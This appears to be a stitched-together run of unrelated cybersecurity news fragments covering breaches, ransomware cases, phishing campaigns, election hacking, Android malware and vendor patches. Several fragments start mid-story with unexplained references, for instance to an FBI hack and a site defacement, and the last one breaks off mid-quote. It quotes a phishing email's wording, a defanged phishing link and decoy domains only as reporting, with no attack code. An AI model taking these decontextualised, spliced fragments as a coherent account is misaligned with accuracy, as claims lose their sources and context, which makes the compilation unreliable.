Hacktivists, scam artists and even terrorists intend to sell, trade or just give away the addresses and passwords, said the Digital Citizens Alliance report. 
During eight years of scanning the dark web—the portion of the Internet not indexed for open searches, where criminals covertly operate—researchers from the security firm ID Agent discovered nearly 14 million addresses and passwords belonging to faculty, staff, students and alumni available to cyber criminals. Of those, 79 percent of the credentials were placed there within the last year. 
The nonprofit Digital Citizens Alliance, based in Washington, D.C., wanted to demonstrate in its recent report the scale and complexity of the problem facing large organizations that try to protect email users. ""Higher education institutions have deployed resources and talent to make university communities safer, but highly skilled and opportunistic cyber criminals make it a challenge to protect large groups of highly desirable digital targets,"" the group's Deputy Executive Director, Adam Benson, says in a statement. ""We shared this information from cybersecurity researchers to create more awareness of just what kinds of things threat actors are capable of doing with a .edu account.""
ID Agent noted that large Midwestern institutions appear to be the most vulnerable, although it is not clear why they are targets. Topping the list is the University of Michigan, with 122,556 email addresses found on the dark web, followed by Penn State University, the University of Minnesota, Michigan State University, Ohio State University and the University of Illinois.
""Cyber criminals are motivated to be successful, so it's not surprising to see a significant number of stolen .edu accounts attributed to large and prestigious technical schools,"" Brian Dunn, ID Agent's managing partner, says in a statement.
Criminals and hacktivists can use the fake emails to scam others or take advantage of discounts offered to students and faculty on products such as software.
Higher education institutions have taken steps to beef up their cybersecurity postures, especially after the Research and Education Networking Information Sharing and Analysis Center last year alerted officials to compromised credentials. ""Universities are aware of the reuse problem and have worked hard to educate members of the university community how to protect themselves,"" according to the Digital Citizens Alliance. ""We saw examples of pages on [university-operated] websites explaining how to create effective passphrases and use two-factor authentication.""

Valentine’s Day is fast-approaching and the story goes that if Cupid hits you with his golden arrow you’ll fall madly in love.
But there are other actors taking aim at you on Valentine’s Day whose arrows you need to avoid as the outcomes aren’t nearly as desirable.
Think back to early February 2016, when many online florists experienced a surge in traffic that wasn’t due simply to a rush to buy flowers.
Dozens of florists were hit by targeted DDoS attacks during their busiest time of the year, causing problems for some and knocking others offline who were asked to pay a ransom before they could resume operations.
It’s fairly typical for bad actors to escalate extortion-based campaigns during seasonal events when the stakes for targets are high.
Looking to profit with minimal investment, attackers exploit known vulnerabilities as they attempt to breach systems.
For example, the 2016 Valentine’s Day DDoS attacks used Shellshock, a critical vulnerability that’s present in Linux, UNIX and Mac OS X that had been discovered more than a year earlier.
Of course, online florists are not alone when it comes to being targeted by cyber criminals.
Different times of the year and major news events can trigger a surge in attacks aimed at particular industries and geographies.
Organisations need to understand their threat model and apply security processes as appropriate.
Threat actors will continue to take advantage of events to launch attacks, but you can avoid their arrows this Valentine’s Day.

    A globally co-ordinated cyber attack has hit 500 industrial companies in 50 countries in the past few months, according to security company Kaspersky.
The worst affected were companies in the smelting, electric power generation and transmission, construction, and engineering industries.
The attacks take the form of emails purportedly from famous companies – such as DHL and Saudi Aramco – and most were sent from “legitimate email addresses belonging to valid organizations”, says Kaspersky.
However, Kaspersky says its analysis of the emails compared to known malware shows that “no new code was written specifically for this attack”.
Kaspersky says the hackers could have accessed and read previous communications between the target and their partners.
They may then have used this information to craft email communications which appear to be legitimate, so that the victim didn’t recognize the malicious aspect of the email.
If the email is opened, it can steal the user’s authentication credentials, which are send to a remote server.

He's experimented with a simulated water treatment system based on actual programmable logic controllers (PLCs) and documented how these can be hacked.
David Formby, a PhD student at Georgia Institute of Technology, conducted his experiment to warn the industry about the danger of poorly-secured PLCs.
These small dedicated computers can be used to control important factory processes or utilities, but are sometimes connected to the internet.
For instance, Formby found that 1,500 of these industrial PLCs are accessible online, he said while speaking at the RSA cybersecurity conference on Monday.
It's not hard to imagine a hacker trying to exploit these exposed PLCs, he added.
Cybercriminals have been infecting businesses across the world with ransomware, a form of malware that can hold data hostage in exchange for bitcoin.
For a hacker, holding an industrial control system hostage can also be lucrative, and far more devastating for the victim.
“He (the hacker) can threaten to permanently damage this really sensitive equipment,” Formby said.
In a month's time he developed a ransomware-like attack to control the PLCs to fill the storage tank with too much chlorine, making the water mix dangerous to drink.
Formby also managed to fool the surrounding sensors into thinking that clean water was actually inside the tank.
A hacker wanting to blackmail a water utility could take a same approach, and threaten to taint the water supply unless paid a ransom, he warned.
Real-world water treatment systems are more sophisticated than the generic one he designed, Formby said.
However, poorly-secured PLCs are being used across every industry, including in oil and gas plants and manufacturing.
Most of these PLCs he found that were accessible online are located in the U.S., but many others were found in India and China, he said.
Formby recommends that industrial operators make sure they understand which systems connect to the internet, and who has control over them.
He’s also set up a company designed to help operators monitor for any malicious activity over their industrial control systems.

 In one of the more bizarre data breaches to surface recently, hackers made off with 6 million accounts for CashCrate, a site where users can be paid to complete online surveys, according to a database obtained by Motherboard.
 In short, CashCrate connects users to companies that need people to test new products and services, or take part in daily surveys in exchange for cash.
 The data includes user email addresses, names, passwords, and physical addresses. 
 Judging by timestamps in the stolen database, the earliest accounts date way back to 2006, and come with full passwords. If a user signed up to another service with the same password, hackers could access the victim's account on another site, as well as their CashCrate account.
 Accounts from mid 2010 onwards appear to have passwords hashed with the notoriously weak MD5 algorithm, meaning that hackers may be able to crack the hashes and obtain the real login credentials.
 For-profit breach notification site LeakBase provided Motherboard with a copy of the CashCrate data. 
 To verify that the data was legitimate, Motherboard attempted to create accounts with random email addresses included in the data. In every instance, this was not possible, because the email was already linked to an account on CashCrate.
 As an indication of CashCrate's approach to cybersecurity, the site does not use basic web encryption, including on its login page, meaning that credentials could be exposed to anyone in a position to intercept them.
 ""We're in the process of notifying all our members about the breach. While we're still investigating the cause, at this point it appears that our third-party forum software was compromised, which led to the breach. We've deactivated it until we're confident it's secure,"" a CashCrate spokesperson told Motherboard in an email.
 ""We have also confirmed that any users who have logged in since October 2013 have passwords that are fully hashed and salted, and we're looking into why some inactive accounts have plaintext passwords. Those will be hashed and salted immediately,"" the spokesperson added.
  The lesson: We all sign up to odd or random websites. If possible, it may be worth using a different email address for these more leftfield sites, or even creating dedicated addresses for each. That way, when a breach does occur, any fallout will be mitigated, and hopefully limited to only one or a few sites. That, and you should use a unique password for every site too.

Whether cops are going undercover to learn more about suspects, or deploying hacking tools to unmask them on a mass scale, each side is always trying to stay one step ahead of the other.
Apparently in response to law enforcement's use of malware, one dark web child pornography site recently started redirecting visitors to a page with additional security advice if their browser runs JavaScript.
""At [child pornography site] we have always had a big JavaScript warning if you have it enabled,"" one user on a dark web child abuse site wrote in December of last year.
JavaScript is sometimes used as a delivery mechanism for a browser exploit; meaning that if users turn it on, they may make themselves vulnerable to attack, which could ultimately reveal their identity.
But this site doesn't just warn people about the dangers of JavaScript.
Tails is an operating system that routes all of a user's traffic through the Tor anonymity network, and is designed to not leave any forensic traces on the host machine.
The dark web child pornography site also blocks connections from Tor2Web gateways, which are proxies that people can use to access dark web sites without the protection of the Tor network.
The site also allegedly stops people accessing it via mobile phone browsers.

Leading French presidential candidate Emmanuel Macron’s campaign said on Friday it had been the target of a “massive” computer hack that dumped its campaign emails online 1-1/2 days before voters choose between the centrist and his far-right rival, Marine Le Pen. 
Macron, who is seen as the frontrunner in an election billed as the most important in France in decades, extended his lead over Le Pen in polls on Friday.   
As much as 9 gigabytes of data were posted on a profile called EMLEAKS to Pastebin, a site that allows anonymous document sharing. It was not immediately clear who was responsible for posting the data or if any of it was genuine. 
In a statement, Macron’s political movement En Marche! (Onwards!) confirmed that it had been hacked. 
“The En Marche Movement has been the victim of a massive and co-ordinated hack this evening which has given rise to the diffusion on social media of various internal information,” the statement said. 
An interior ministry official declined to comment, citing French rules that forbid any commentary liable to influence an election, which took effect at midnight on Friday (2200 GMT). 
The presidential election commission said in statement that it would hold a meeting later on Saturday after Macron’s campaign informed it about the hack and publishing of the data.  
Former economy minister Macron’s campaign has previously complained about attempts to hack its emails, blaming Russian interests in part for the cyber attacks. 
On April 26, the team said it had been the target of a attempts to steal email credentials dating back to January, but that the perpetrators had failed to compromise any campaign data. 
The Kremlin has denied it was behind any such attacks, even though Macron’s camp renewed complaints against Russian media and a hackers’ group operating in Ukraine. 
Vitali Kremez, director of research with New York-based cyber intelligence firm Flashpoint, told Reuters his review indicates that APT 28, a group tied to the GRU, the Russian military intelligence directorate, was behind the leak. He cited similarities with U.S. election hacks that have been previously attributed to that group.  
APT28 last month registered decoy internet addresses to mimic the name of En Marche, which it likely used send tainted emails to hack into the campaign’s computers, Kremez said. Those domains include onedrive-en-marche.fr and mail-en-marche.fr. 
“If indeed driven by Moscow, this leak appears to be a significant escalation over the previous Russian operations aimed at the U.S. presidential election, expanding the approach and scope of effort from simple espionage efforts towards more direct attempts to sway the outcome,” Kremez said. 
France is the latest nation to see a major election overshadowed by accusations of manipulation through cyber hacking. 
En Marche said the documents only showed the normal functioning of a presidential campaign, but that authentic documents had been mixed on social media with fake ones to sow “doubt and misinformation”. 
Ben Nimmo, a UK-based security researcher with the Digital Forensic Research Lab of the Atlantic Council think tank, said initial analysis indicated that a group of U.S. far-right online activists were behind early efforts to spread the documents via social media. They were later picked up and promoted by core social media supporters of Le Pen in France, Nimmo said. 
The leaks emerged on 4chan, a discussion forum popular with far right activists in the United States. An anonymous poster provided links to the documents on Pastebin, saying, “This was passed on to me today so now I am giving it to you, the people.”

There’s a new scam on the block and over 200 people have already been hit. Here’s what you need to know about the TV Licence con.
Action Fraud is warning that criminals are sending out emails pretending to be from TV Licensing.
The watchdog says it has already received over 200 reports about the phishing scam.
The email lures you in by saying you are owed a refund on your TV Licence payments. But, it’s a con and all the senders are really after is your bank details.
What does the email say?
So far all the emails have been the same. They say:
“This is an official notification from TV Licensing!
“We would like to notify you that, after the last annual calculation we have determined that you are eligible to receive a TV Licensing refund of 85.07 GBP.
“Due to invalid account details records, we were unable to credit your account. Please fill in the TV Licensing refund request and allow us 5-6 working days to the amount to be credited to your account.”
All this is untrue. If you receive this email the best thing to do is report it to Action Fraud and then delete it. Do not click on any links within the email.
“A small number of our customers have received scam email messages saying they are due a refund,” a spokesperson for TV Licensing has said. “A link directs customers to a fake version of the official TV Licensing website which asks them to enter personal information and bank details.
“If you receive a similar email message please delete it. If you have already clicked the link, do not enter or submit any information. TV Licensing never sends refund information by email and is investigating the source of the fraud.”
While these emails are a scam they carry an element of truth – you might be due a refund from TV Licensing.
There are a number of ways you can avoid paying the full licence fee.
If you are a student you are entitled to a £37 discount on the £147.50 colour TV licence.
You can also apply for a refund if you’ve paid for a TV Licence beyond your 75th birthday. Anyone over the age of 75 is entitled to watch TV for free.
TV Licences apply to households not individuals so if anyone if your household is a student, or over 75 then you all get the benefit of their discount.
Similarly, if someone in your house is severely visually impaired they are entitled to a half-price TV licence.
You can apply for a refund via the official TV Licensing Website.

The Register has contacted the FBI to confirm the allegations.
The agency was not immediately available for comment – although a staffer said they were aware of the alleged break-in.
Cyberzeist claims to have conducted the hack last month and has posted to Twitter what they claim are screen captures showing the FBI patching against the vulnerability, which appeared to permit public access.
The hacker dumped the 155 purported stolen credentials to online clipboard pastebin, claiming a vulnerability resides in a Plone Python module.
Cyberzeist also claimed the FBI contacted the hacker requesting a copy of the stolen credentials, which they declined to provide.
The hacker reckoned the CMS was hosted on a virtual machine running a custom FreeBSD.
They said they will tweet the zero day flaw once it is no longer for sale.

Authorities on Wednesday charged two Iranian citizens for the ransomware cyber attack that hobbled the city of Atlanta’s computer network in March, and the federal indictment outlines the pair’s massive nationwide scheme to breach computer networks of local governments, health care systems and other public entities.
The defendants, Faramarz Shahi Savandi, 34, and Mohammad Mehdi Shah Mansouri, 27, are alleged to have developed the SamSam ransomware, malicious software that encrypts data until the infected organizations paid ransom. 
All told, the pair inflicted harm on more than 200 victims across the country and collected roughly $6 million in ransom over a three year period dating back to 2015. Their scheme caused over $30 million in losses to various entities, according to federal authorities.
The hack to city of Atlanta computers in March crippled city business for days. One internal report that surfaced in August estimated the damage to the city could cost up to $17 million.
“We’re glad that these people will be brought to justice,” Mayor Keisha Lance Bottoms told Channel 2 Action News. “Hopefully this will stop another municipality from experiencing what we did.”
“The defendants allegedly hijacked victims’ computer systems and shut them down until the victims paid a ransom,” said Deputy Attorney General Rod Rosenstein, speaking at a press conference in Washington D.C. “Many of the victims were public agencies with missions that involve saving lives and performing other critical functions for the American people.”
The two men are not in U.S. custody, and Iran has no extradition treaty with the U.S. But Justice Department officials expressed confidence that the Savandi and Mansouri’s travel patterns would subject them to being captured.
Atlanta officials have repeatedly denied paying the $51,000 in ransom demanded by the hackers and the 26-page federal indictment released Wednesday doesn’t directly address which cities and entities paid ransom. Brian Benczkowski, an assistant attorney general for the U.S. Justice Department, told reporters on Wednesday that the agency wouldn’t identify which victims paid the attackers.
A city of Atlanta spokesperson on Wednesday said again that no one acting on the city’s behalf, including its insurance carrier, paid any ransom. But the indictment has two references to Atlanta and it raises questions about whether or not the city paid ransom.
The indictment describes the March 22 assault on Atlanta’s network and the effort by the two men to demand ransom. In one paragraph, the indictment says they demanded ransom from Atlanta in Bitcoin payments in exchange for encryption keys to recover the city’s compromised data.
The next paragraph says that on April 19, Savandi “received funds associated with ransom proceeds, which were converted into Iranian rial and deposited by” an currency exchanger. The indictment does not say if those proceeds were associated with the Atlanta attack.
But Ralph Echemendia, a computer hacking consultant who advises corporations on cyber security, said he read the indictment and thinks the payment was associated with the Atlanta attack because it would be one way that federal agents connected the breach to Savanda and Mansouri.
The indictment describes how the two men demanded payments in bitcoins, a so-called crypto currency, and in Atlanta’s case, the demand equaled roughly $50,000.
“The moment you try and turn it into dollars, euros or any kind of real currency it has to go through an exchange,” Echemendia said. “At that point the exchange would have to work with law enforcement … ultimately that is going to wind up in somebody’s back account.”
The Justice Department declined to answer a question from the AJC about whether April 19 exchange of bitcoins into Iranian rial described in the indictment was related to Atlanta’s attack.
Tony UcedaVelez, CEO of Versprite, an Atlanta based security services said the language in the indictment does make it seem a ransom was paid on the city’s behalf. But he said it could have been made by someone in law enforcement hoping the funds would lead to the attackers.
UcedaVelez also pointed to an attachment in the indictment that indicated someone associated with the city had followed the attackers’ initial instructions.
The indictment included a ransom note to Newark instructing it on how to download a Tor network browser and visit the attackers’ website where victims could upload two files to be decrypted as a demonstration. Newark paid its ransom of roughly $30,000.
Another attachment shows the ransom website the attackers created for the city of Atlanta on the Tor network. To get there, someone would have had to download the Tor browser. And it appeared they had uploaded a couple of files for the demonstration.
“Files available to decrypt: 2,” read a statement on the site.

The hackers left a deface page along with a brief message explaining the reason for defacing the site and criticizing the role of “political elite” for the problems faced by “common people”.
The message also criticized the role of Bilderberg group for planning wars for personal interests.
The hackers also warned the group members to start working for human beings and their benefits rather than personal interests or expect more hacks since “they” the hackers will be watching them.
“Dear Bilderberg members, from now, each one of you has 1 year (365 days) to truly work in favor of humans and not your private interests.

The hacker then hacked the Catalan Police Union server and leaked highly sensitive data against police brutality.
The same hacker then hacked Spanish Police server and ended up leaking personal details of police officers against the infamous Gag Law.

Nintendo recently released Super Mario Run for the iOS platform.
In no time, the game became a sensational hit on the iTunes store.
However, there is not yet an Android version and there has been no official news on such a release.
Attackers are taking advantage of the game's popularity, spreading malware posing as an Android version of Super Mario Run.
The ThreatLabZ team wrote about a similar scam that occurred during the release of another wildly popular Niantic game, Pokemon GO.
Like that scam, the new Android Marcher Trojan is disguised as the Super Mario Run app and attempts to trick users with fake finance apps and a credit card page in an effort to capture banking details.
Once the user's mobile device has been infected, the malware waits for victims to open one of its targeted apps and then presents the fake overlay page asking for banking details.
Unsuspecting victims will provide the details that will be harvested and sent out to to the malware's command and control (C&C) server.
We have seen this malware evolve and take advantage of recent trends in order to target a large number of users.
We have covered similar campaigns in the past related to Marcher malware here and here.
Technical details
In this new strain, the Marcher malware is disguised as the Super Mario Run app for Android.
Knowing that Android users are eagerly awaiting this game, the malware will attempt to present a fake web page promoting its release.
In previous variants of Marcher, we observed this malware family targeting well-known Australian, UK, and French banks.
The current version is targeting account management apps as well as well-known banks.
Like previous Marcher variants, the current version also presents fake credit card pages once an infected victim opens the Google Play store.

The NJCCIC assesses with high confidence that fileless and “non-malware” intrusion tactics pose high risk to organizations, both public and private, and will be increasingly employed by capable threat actors intent on stealing data or establishing persistence on networks to support ongoing espionage objectives or to enable future acts of sabotage.
Furthermore, we assess most organizations are not currently equipped to defend against these tactics.
The NJCCIC recommends all organizations reevaluate the capabilities and efficacy of their current cybersecurity technologies and processes, as well as their staffs, to ensure they are effectively managing and reducing the risk of data breaches and disruptive or destructive attacks conducted using fileless methods.
To address the risk posed by fileless and non-malware tactics, organizations must first adopt a comprehensive cyber risk management framework and implement robust cybersecurity best practices and defensive measures, including, but not limited to, the bulleted items below.
Additionally, organizations will need to employ enhanced logging, monitoring, and analysis of all network, host, and user activity to identify fileless tactics.
To do so, enterprises may need to procure third-party products and managed services that include capabilities such as full system endpoint protection with memory and registry monitoring, behavioral analytics, next-generation firewalls, and email content inspection.

A new iPhone and a new iOS are here, but a number of bugs, and security flaws, have frustrated early adopters.
iOS 12.0.1, Apple's first update after the release of iOS 12, has patched two vulnerabilities that could have allowed a user to bypass a device's passcode. Spanish hacker Jose Rodriguez was able to use Siri to enable VoiceOver mode, which could pull up the phone's contacts. You can see the specifics of his (very complicated) procedure in the video below. 
Apple also says it has fixed a bug that caused the new iPhones to stop charging when their screens turned off. This wasn't an issue our review unit had, but it was noted throughout multiple forums and message boards. 
The company has fixed a number of smaller bugs as well. A bug that caused the phone to automatically join 2.4-GHz networks rather than 5 GHz networks, a bug that sometimes caused Bluetooth to become unavailable, and a bug that blocked subtitles from appearing in some video apps are no longer.
iPad users weren't left out, either. To some users' chagrin, the original iOS 12 moved the ""123"" key closer to the center of the iPad keyboard. You can breathe easy again: The key has moved back to the far left. 
The update should be available to all users now. If you don't have automatic updates enabled, we recommend you update to the new patch ASAP if you've experienced any of these flaws, or are worried about hackers obtaining your phone.

A researcher discovered, that WhatsApp (or Facebook) could force the WhatsApp mobile client to generate new encryption keys.
Due to this, WhatsApp would be able to intercept the key exchange and - of course - would be able to intercept the messages.
This is how a man-in-the-middle attack works and it only works when both parties - which are communicating with each other - do not verify the fingerprints of the exchanged keys.
Signal and WhatsApp are using a concept called “TOFU” or “Trust on first use”.
This means, that when a key is exchanged, this key is trusted as long as the key does not change.
Signal and WhatsApp have different default settings what happens, when the key-material of a contact changes:
WhatsApp just notifies the user when key material changes.
Signal blocks outgoing messages and does not send new messages to a user where the key material has changed.
A Signal user has to manually verify the new key by default (in this case, a user should verify the key material in person by scanning the QR code of the fingerprint).

Last late April a friend of mine had his iPhone stolen in the streets—an unfortunately familiar occurrence in big, metropolitan areas in countries like Brazil. He managed to buy a new one, but kept the same number for convenience. Nothing appeared to be out of the ordinary at first—until he realized the thief changed his Facebook password.
Fortunately, he was able to recover and update it, as his phone number was tied to his Facebook account. But a pickpocket accessing his victim’s Facebook account is quite unusual. After all, why would a crook be interested with his victim’s Facebook account for when the goal is usually to use or sell the stolen device? It didn’t stop there; a day after, my friend curiously received a phishing SMS message on his new phone.
What’s interesting here is the blurred line between traditional felony and cybercrime—in particular, the apparent teamwork between crooks and cybercriminals that results in further—possibly more sophisticated—attacks.

Figure 1: SMS message with a link to a phishing page
The SMS message, written in Portuguese, translates to: “Dear user: Your device in lost mode was turned on and found; access here and view its last location:”. The message was accompanied with a link pointing to hxxp://busca-devices[.]pe[.]hu, which we found to be a phishing page with a log-in form asking for Apple ID credentials.
We then checked the last location of his stolen iPhone, the official iCloud website indeed confirmed that it was where he had the phone snatched.

Figure 2: Phishing page asking for Apple ID credentials
Connecting the dots, it appears the modus operandi is to physically steal the victim’s phone (while in use, so they can still access the apps), uncover the device’s number, then try changing the password of installed social networking (and possibly email) apps—probably to extort the victim in the future—before turning the stolen device off as soon as possible. Attackers then try to grab the victim’s Apple ID credentials using a phishing page and a socially engineered SMS message pretending to be Apple. Apart from perpetrating identity theft, getting their hands on Apple credentials allows them to disable the Activation Lock feature in iOS devices which would enable them to wipe the phone (as part of an attack, or for them to reuse the device).

Figure 3: iCloud phishing page advertised in the Brazilian underground
Interestingly, we came across an iCloud phishing page peddled for R$135 (roughly equivalent to US$43 as of May 4, 2017) during one our recent forays into the Brazilian underground. The phishing page offered for rent came with a video tutorial explaining how the service works. Coincidence? While there may be no direct correlation, it wouldn’t be surprising if it somehow intersects with my friend’s iPhone scam situation—given how Apple credentials are one of the commodities sold in Brazil’s online underworld. In fact, this kind of attack has been reported in Brazil as early as 2015.

The moral of my friend’s story? Traditional crime and cybercrimes are not mutually exclusive and can, in fact, work together in seemingly bigger attacks or malicious schemes. Another lesson learned? Physical security strengthens cybersecurity. This rings true—even intuitive—not only to individual end users. Organizations understand that the risks of attacks are just as significant if their workplace’s perimeters aren’t as properly secure as their virtual/online walls.
Indeed, today’s increasingly intricate—and in a lot of cases, brazen—attacks, whether physical or in cyberspace, call for being more proactive. Being aware of red flags in phishing scams, securing the privacy of mobile apps, and adopting best practices for BYOD devices, are just some of them. These are complemented by physically securing mobile devices—from password-protecting important documents to employing biometrics or strong PINs to prevent unauthorized access to the device’s apps.
Users can also benefit from multilayered mobile security solutions such as Trend Micro™ Mobile Security for Apple devices (available on the App Store) that can monitor and block phishing attacks and other malicious URLs. For organizations, especially those that use BYOD devices, Trend Micro™ Mobile Security for Enterprise provides device, compliance and application management, data protection, and configuration provisioning, as well as protect devices from attacks that leverage vulnerabilities, preventing unauthorized access to apps, as well as detecting and blocking malware and fraudulent websites.
With help from our colleagues from PhishLabs, we were able to take down the phishing pages that were still online. We also disclosed to Apple our findings related to this threat. The domains we uncovered related to this scam are in this appendix.

The Google Doc phishing scam that conned over a million users this week illustrates how attackers cleverly respond to wider spread end-user awareness about how phishing attacks work.
The attack didn't ask users to enter credentials. Instead, it exhibited very few traditional phishing scam behaviors and couldn't have been detected by endpoint protections. Some researchers are calling this attack a ""game changer"" that could be just the start of a new wave of attacks that take advantage of third-party authentication connections rampant in the cloud services-based economy. 
The attack tricked victims into clicking a link that gave attackers access to their Google Drive through OAuth authentication connections commonly used by third-party applications. The attackers did so by sending victims lure messages claiming to contain links to a shared Google Doc.
Instead of a legit document, the link actually initiates a process to give a phony app masquerading as ""Google Docs"" access to the user's Google account. If the user is already logged into Google, the connection routes that app into an OAuth permissions page asking the user to ""Allow"" access to the user's legitimate Google Drive.
""You aren't giving your Google credentials directly to the attacker. Rather, OAuth gives the attacker permissions to act on behalf of your account. You're on the real Google permissions page. OAuth is a legitimate way to give third-party applications access to your account. The application name is 'Google Docs,' which is fake but convincing,"" says Jordan Wright, R&D engineer for Duo Security. ""So unless you know that Google Docs won't ask for your permissions, there is little you could use to determine that this was fake.""
The lure emails appear to come from Google Drive from a previous victim, making it difficult to detect as a fakeout, says Travis Smith, senior security researcher at Tripwire.
""Not only does this have a casual appearance of being legitimate, by being part of the official marketplace the link in the email went back directly to legitimate Google servers,"" says Smith. ""For those that are trained to validate the link before clicking on it, this passes two of the common techniques the majority of internet users are trained to not click on every link they come across: 'Does it come from someone you trust and validate the link is going to a trusted source?'""
The only big tip-off is that many of the messages seem to have an suspicious account, hhhhhhhhhhhhhhhh@mailinator.com, cc'd on the message, says John Bambenek, threat research manager at Fidelis Cybersecurity. He says the attack shows the glaring problem with OAuth, namely that it allows passive authentication.
Netskope's analysis found that a number of enterprise users across various industries ended up falling prey to this attack. Google worked to quickly block the attack, but there was a window of opportunity in that time between compromise and mitigation where emails, contacts, attachments and whatever else on a Google account could have been purloined, he warns.
""If an enterprise has identified that their users have granted access to the app in this attack, we recommend they conduct a full audit of the activities that were performed in Google Gmail after the permissions were granted to the app,"" Balupari writes.

While working on something completely unrelated, Google security researcher, Tavis Ormandy, recently discovered that Cloudflare was leaking a wide range of sensitive information, which could have included everything from cookies and tokens, to credentials.
Cloudflare moved quickly to fix things, but their postmortem downplays the risk to customers, Ormandy said.
The problem on Cloudflare's side, which impacted big brands like Uber, Fitbit, 1Password, and OKCupid, was a memory leak.
The flaw resulted in the exposure of ""HTTP cookies, authentication tokens, HTTP POST bodies, and other sensitive data,"" Cloudflare said.
About an hour after being alerted by Ormandy, Cloudflare disabled three features on its platform; email obfuscation, Server-side Excludes and Automatic HTTPS Rewrites, as they were using the broken HTML parser chain determined to be the cause of the problem.

A second UK university has been hit by a major ransomware attack this week, as new figures showed the country is the most frequently targeted by the malware in Europe.
The attack appears to have struck Northern Ireland’s Ulster University on the same day a ransomware outage affected University College London (UCL).
Ulster Uni’s Information Services Division (ISD) revealed yesterday that its AV partner suspects a zero-day threat was the cause, also echoing the current thinking at UCL.
Three departmental file shares have been affected and remained at “read only” access at the time of writing.
Like its counterparts at UCL, Ulster University’s ISD appears to be following best practice regarding back-ups, which will help mitigate the impact of the attack.
It explained:
“ISD take backups of all our shared drives and this should protect most data even if it has been encrypted by the malware. Once we are confident the infections have been contained, then we will restore the most recent back up of the file. ISD can confirm that a backup of the shares was successfully taken at close of business on Tuesday 12th June.”
Fraser Kyne, EMEA CTO at Bromium, urged all UK university IT teams to be on high alert for possible attacks.
“The initial reports are suggesting that the ransomware was able to get in at UCL through a zero-day exploit, which allowed it to bypass antivirus software,” he added. “That really underscores the limitations of antivirus; in that it is only able to stop things that it knows are bad. Given that most malware is only seen once in the wild before it evolves into something different, there’s very little that antivirus can offer in the way of protection.”
UCL now believes the initial infection vector was a user visiting a compromised website rather than opening a phishing email attachment as first thought.
The latest stats from Malwarebytes show the UK is the hardest hit in Europe when it comes to ransomware.
There were three-times as many detections in the UK in Q1 2017 than the next most impacted country: France. In fact, while ransomware infections dropped 4% across Europe they increased 57% in the UK year-on-year.
The total volume of cyber-attacks on UK firms soared 500% year-on-year, with no single threat type declining. Across Europe, Italy and the UK were almost tied as having the highest number of malware detections in Europe; 16.3% and 16.2% respectively.

The details of more than 100m Indians’ Aadhaar ID cards have leaked from four government portals, according to a report from the Centre for Internet and Society (CIS).
Based on the numbers available on the websites looked at, [the] estimated number of Aadhaar numbers leaked through these four portals could be around 130-135 million
If you’re not familiar with the Aadhaar numbers, we’ve previously reported on the history of and concerns surrounding this biometric ID card. Now a fundamental part of Indian society, anyone that has not signed up faces being denied access to many government and private-sector services and schemes.
As the government presses on with intertwining the card into everyday life, concerns about the security of the vast amounts of personal data being stored and the potential for its misuse by cyber-criminals continue to mount.
The disclosures came as part of a report entitled Information Security Practices of Aadhaar (or lack thereof): A Documentation of Public Availability of Aadhaar Numbers with Sensitive Personal Financial Information, which focuses on just four of India’s numerous government portals:
But it’s not just the ID numbers that the report is worried about; it also claims that the leaks contain “personally identifiable information of beneficiaries or subjects of the leaked databases”, putting the estimated number of bank accounts leaked at around 100m.

The Unique Identification Authority of India (UIDAI), which issues the Aadhaar numbers, claims that there have been no leaks, according to The Times of India. The paper also quotes one official as saying something rather different
While Aadhaar numbers are available, the biometric information is not … The leaked databases do not pose a real threat … because the Aadhaar number cannot be misused without biometrics.
And another that another official as saying that the “Aadhaar number is not confidential just as bank account number which is mentioned in cheque books and shared with lot of people”.

It seems that, despite the official line, Aadhaar numbers are getting out into the public domain.
The question has to be whether the personally identifiable information that is being published alongside them is enough for fraudsters to steal someone’s identity. I haven’t yet seen any reports of fraud being committed on the back of a stolen Aadhaar number. Only time will tell.
While this new, controversial ID system beds itself in, the world will be watching closely to see where the cracks in security are, how fraudsters take advantage and how the government reacts to plug any holes. We’ll certainly be keeping a close eye on developments.

Yesterday, Oracle released its quarterly critical patch update (CPU) for Q3 2018, the October edition, during which the company fixed 301 vulnerabilities.
Of the 301 flaws, 45 had a severity rating of 9.8 (on a scale of 10) and one even received the maximum 10 rating.
Vulnerabilities that receive this severity ratings this high can be exploited remotely, with no authentication, and the exploit chain is accessible even to low-skilled attackers, even to those with no in-depth technical knowledge.
Oracle's security team will publish more information about each vulnerability in the coming days. This will give companies more time to update affected applications before details about each flaw are generally available to everyone, including the bad guys.
For now, little information is known, but the vulnerability that received the 10.0 rating impacts Oracle GoldenGate, a data replication framework that can work with large quantities of information in real-time.
This issue doesn't impact standalone GoldenGate installations, but also the numerous other Oracle product setups where GoldenGate can be deployed as an add-in option, such as the Oracle Database Server, DB2, MySQL, Sybase, Terradata, and others.
As for vulnerabilities rated 9.8 on the severity scale, these were reported affecting products such as the Oracle Database Server, Oracle Communications, the Oracle Construction and Engineering Suite, the Oracle Enterprise Manager Products Suite, Oracle Fusion Middleware, Oracle Insurance Applications, Oracle JD Edwards, MySQL, Oracle Retail, the Oracle Siebel CRM, and the Oracle Sun Systems Products Suite.
Despite the staggering number of patched flaws --301--, this isn't Oracle's biggest recorded CPU. That title goes to July 2018's CPU, which addressed 334 vulnerabilities, 55 of which had a 9.8 severity rating.
This was also Oracle's last CPU for 2018. According to the folks at ERPScan, in 2018, Oracle patched 1119 vulnerabilities, the same number of flaws it patched last year in 2017.

IBM has withdrawn a patch for a significant security vulnerability in its WebSphere Application Server after the code knackered some systems.
Just this week, Big Blue said it is working on a new fix for CVE-2018-1567, a remote-code execution vulnerability in versions 9.0, 8.5, 8.0, and 7.0 of the platform.
According to IBM, the vulnerability would potentially allow an attacker to remotely execute Java code on a vulnerable web-app server via its SOAP connector port. The bug was sealed up on September 5, when IBM made the fix available for download and installation.
Unfortunately, the patch had been causing problems, forcing IBM to pull the fix on Wednesday, more than a month. Big Blue said the patch was yanked ""due to regression"", which is the fancy way of saying it was mucking stuff up.
""There may be a failure after the security fix for PI95973 is installed,"" IBM tells customers. ""The fix has been removed while it is being reworked by development.""
IBM did not say when the updated patch might be arriving, putting some admins in the difficult position of either leaving a vulnerability open or risking crashes. We've asked the New York-based IT giant for more details, following a tip off from an eagle-eyed reader – let us know if you also spot any strange goings on with patches and so forth.

A malvertising campaign is targeting iOS devices with a VPN that doesn't hide the fact it collects large quantities of users' information.
It also employs the aggressive tactic of playing a high-pitch beeping.

""We have detected that your Mobile Safari is (45.4%) DAMAGED by BROWSER TROJAN VIRUSES picked up while surfing recent corrupted sites.

